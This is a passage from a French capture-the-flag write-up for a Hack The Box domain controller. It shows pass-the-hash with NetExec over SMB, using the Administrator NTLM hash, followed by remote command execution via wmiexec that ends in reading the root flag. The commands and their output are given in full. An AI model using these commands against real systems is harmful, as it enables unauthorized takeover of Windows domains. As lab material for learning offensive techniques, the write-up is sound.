Et voila j'ai bien le hash de l'admin alors Pass-the-hash


```terminal
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/CertifAD]
└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee -x whoami
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
SMB         10.129.228.253  445    DC               [+] Executed command via wmiexec
SMB         10.129.228.253  445    DC               sequel\administrator

└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
SMB         10.129.228.253  445    DC               [+] Executed command via wmiexec
SMB         10.129.228.253  445    DC               2981482e4681ca3eedbe3ff90180540b


```












